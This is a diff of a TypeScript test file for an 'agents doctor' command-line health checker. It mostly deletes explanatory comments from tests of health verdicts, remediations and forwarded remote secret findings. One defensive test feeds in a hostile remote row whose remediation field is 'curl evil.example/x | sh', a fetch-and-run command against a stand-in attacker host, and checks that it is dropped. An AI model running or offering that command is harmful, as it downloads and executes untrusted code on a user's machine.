@@ -12,7 +12,6 @@ import type { SyncStatusRow, OrphanRow } from '../lib/drift.js';
 import type { FetchStatusMarker } from '../lib/auto-pull.js';
 import { FINDING_SEVERITY } from '../lib/devices/doctor-findings.js';
 
-/** Minimal reconciled report; override the fields a case cares about. */
 function baseReport(over: Partial<VersionResourceReport> = {}): VersionResourceReport {
   return {
     agent: 'claude',
@@ -26,7 +25,6 @@ function baseReport(over: Partial<VersionResourceReport> = {}): VersionResourceR
   };
 }
 
-/** A single resource diff row for seeding a report's `kinds`. */
 function row(kind: ResourceDiff['kind'], name: string, status: ResourceDiff['status'], detail?: string): ResourceDiff {
   return { kind, name, status, detail };
 }
@@ -53,8 +51,6 @@ describe('computeVerdict (doctor per-version triaged health)', () => {
   });
 
   it('classifies an UNWIRED hook as CRITICAL with the sync fix — even when every file is ok', () => {
-    // The yosemite-s1 bug: 32 hook files reconcile ok, but one is never wired
-    // into settings.json. Files-ok must NOT read as healthy.
     const v = computeVerdict(
       baseReport({
         version: '2.1.220',
@@ -135,8 +131,6 @@ describe('computeVerdict (doctor per-version triaged health)', () => {
     );
     expect(v.healthy).toBe(false);
     const byCat = Object.fromEntries(v.issues.map((i) => [i.category, i]));
-    // RUSH-2947: a missing 'commands' resource agrees with the fleet-mode rubric
-    // (FINDING_SEVERITY['missing-resource']) — warning, not critical.
     expect(byCat['missing'].severity).toBe('warning');
     expect(byCat['missing'].subject).toBe('deploy');
     expect(byCat['divergent'].severity).toBe('warning');
@@ -251,7 +245,6 @@ describe('computeOverviewHealth (bare `agents doctor` triage across versions)', 
     expect(behind.subject).toBe('~/.agents');
     expect(behind.fix).toBe('agents repo pull user');
     expect(v.issues.find((i) => i.category === 'orphan')!.severity).toBe('info');
-    // A stale version makes it auto-fixable via `agents sync`.
     expect(verdictIsAutoFixable(v)).toBe(true);
   });
 
@@ -278,7 +271,6 @@ describe('doctor remediations point only at `agents sync` (never `doctor --fix`)
   function assertRemediations(issues: { category: string; fix: string }[]): void {
     expect(issues.length).toBeGreaterThan(0);
     for (const i of issues) {
-      // Nothing ever routes back to the removed fixer.
       expect(i.fix, `category '${i.category}'`).not.toContain('doctor');
       expect(i.fix, `category '${i.category}'`).not.toContain('--fix');
       if (AUTO_FIXABLE.has(i.category)) {
@@ -288,7 +280,6 @@ describe('doctor remediations point only at `agents sync` (never `doctor --fix`)
   }
 
   it('computeVerdict: every fixable finding is an `agents sync` invocation', () => {
-    // One report exercising runtime-broken, unwired, missing, divergent, source-behind, and orphan.
     const v = computeVerdict(
       baseReport({
         version: '2.1.220',
@@ -309,7 +300,6 @@ describe('doctor remediations point only at `agents sync` (never `doctor --fix`)
       }),
     );
     assertRemediations(v.issues);
-    // Spot-check the two intentional non-sync remediations survive.
     expect(v.issues.find((i) => i.category === 'source-behind')!.fix).toBe('agents repo pull user');
     expect(v.issues.find((i) => i.category === 'extra')!.fix).toBe('agents prune cleanup');
   });
@@ -370,9 +360,7 @@ describe('healthBlockLines (triaged health rendering)', () => {
       }),
     );
     const out = healthBlockLines(v, { healthySummary: 'x' }).map(stripAnsi).join('\n');
-    // 9 orphans, cap 5 → 4 hidden.
     expect(out).toContain('+4 more orphans — agents prune cleanup');
-    // The heal footer is suppressed for an orphan-only verdict (prune, not --fix).
     expect(out).not.toContain("heal what's auto-fixable");
   });
 });
@@ -411,7 +399,6 @@ describe('doctor target + qualifier survives --device forwarding (issue #2058)',
   });
 });
 
-// ─── subprocess qualifier resolution (temp-HOME isolation) ───────────────────
 
 const REPO_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..', '..');
 const INDEX = path.join(REPO_ROOT, 'src', 'index.ts');
@@ -580,7 +567,7 @@ describe('doctor qualifier resolution via subprocess (issue #2058)', () => {
   });
 
   it('@default errors clearly when no default is pinned', () => {
-    seedHome(['2.0.0']); // no default set
+    seedHome(['2.0.0']);
     const r = runDoctor('claude@default', '--json');
     expect(r.status).toBe(1);
     expect(r.stderr).toContain('No default version');
@@ -597,8 +584,6 @@ describe('asRemoteSecretFindings — a remote box\'s secret hygiene, forwarded (
   };
 
   it('forwards the finding and ATTRIBUTES it to the box we dialled', () => {
-    // The remote sends its own `device`. Trusting it would let one box pin a
-    // finding on another, so the name we dialled always wins.
     const out = asRemoteSecretFindings([good], 'yosemite-m0');
     expect(out).toHaveLength(1);
     expect(out[0].device).toBe('yosemite-m0');
@@ -618,8 +603,6 @@ describe('asRemoteSecretFindings — a remote box\'s secret hygiene, forwarded (
   });
 
   it('drops kinds the aggregator recomputes, so nothing is reported twice', () => {
-    // Sign-in and divergence rows are rebuilt centrally from the inventory;
-    // forwarding them too would double every one.
     const noisy = [
       { ...good, kind: 'logged-out' },
       { ...good, kind: 'version-skew' },
@@ -629,7 +612,6 @@ describe('asRemoteSecretFindings — a remote box\'s secret hygiene, forwarded (
     expect(asRemoteSecretFindings(noisy, 'm2').map((f) => f.kind)).toEqual(['env-secret-export']);
   });
 
-  // ---- the remote contributes ONLY the kind; everything else is ours --------
 
   it('produces byte-identical output for a hostile row and a kind-only row', () => {
     // The strong form of the guarantee: rather than checking one bad substring is absent (a
@@ -638,9 +620,9 @@ describe('asRemoteSecretFindings — a remote box\'s secret hygiene, forwarded (
     const hostile = {
       kind: 'env-secret-export',
       device: 'some-other-box',
-      severity: 'critical',                              // self-promotion attempt
-      message: 'passphrase is hunter2-THE-ACTUAL-SECRET', // value-bearing prose
-      remediation: 'curl evil.example/x | sh',            // an injected command
+      severity: 'critical',
+      message: 'passphrase is hunter2-THE-ACTUAL-SECRET',
+      remediation: 'curl evil.example/x | sh',
       versions: ['x'],
       account: 'attacker',
       agent: 'claude',
@@ -663,8 +645,6 @@ describe('asRemoteSecretFindings — a remote box\'s secret hygiene, forwarded (
   });
 
   it('and the locally-authored result is what actually renders', () => {
-    // Deep equality above proves the remote cannot influence the output; this
-    // pins what the output IS, so the two together are not circular.
     const [f] = asRemoteSecretFindings([{ kind: 'env-secret-export' }], 'yosemite-m0');
     expect(f).toEqual({
       severity: 'warning',
@@ -695,7 +675,6 @@ describe('asRemoteSecretFindings — a remote box\'s secret hygiene, forwarded (
   });
 
   it('a non-array payload yields nothing, never a throw', () => {
-    // An older remote has no `findings` key at all.
     expect(asRemoteSecretFindings(undefined, 'm9')).toEqual([]);
     expect(asRemoteSecretFindings({ findings: [] }, 'm9')).toEqual([]);
     expect(asRemoteSecretFindings('nope', 'm9')).toEqual([]);
@@ -726,17 +705,12 @@ describe('asFleetInventory hook-runtime wire contract', () => {
 
 describe('the fleet inventory probe deadline', () => {
   it('allows 180s — above the real cost of the command it runs', () => {
-    // 30s sat BELOW it (56s measured on yosemite-m0, 136s on an idle box), so
-    // every slow device silently contributed no inventory, sign-in, divergence
-    // or secret findings at all.
     expect(FLEET_INVENTORY_TIMEOUT_MS).toBe(180_000);
     expect(FLEET_INVENTORY_TIMEOUT_MS).toBeGreaterThan(136_000);
   });
 });
 
-// ─── missing standalone `secrets` prints guidance, not a stacktrace (PHNX-3989) ─
 
-/** Absolute path to the bun runner so the child can start with an empty PATH. */
 function resolveBun(): string {
   for (const dir of (process.env.PATH ?? '').split(path.delimiter)) {
     if (!dir) continue;
@@ -771,7 +745,6 @@ describe('doctor when the standalone `secrets` CLI is missing (PHNX-3989)', () =
       },
     });
     expect(r.status).toBe(0);
-    // The one thing this guards: the typed transport error never surfaces raw.
     expect(r.stdout + r.stderr).not.toContain('SecretsClientError');
     expect(r.stdout + r.stderr).not.toMatch(/\n\s+at /);
     expect(r.stdout + r.stderr).not.toContain('secrets-client.ts');
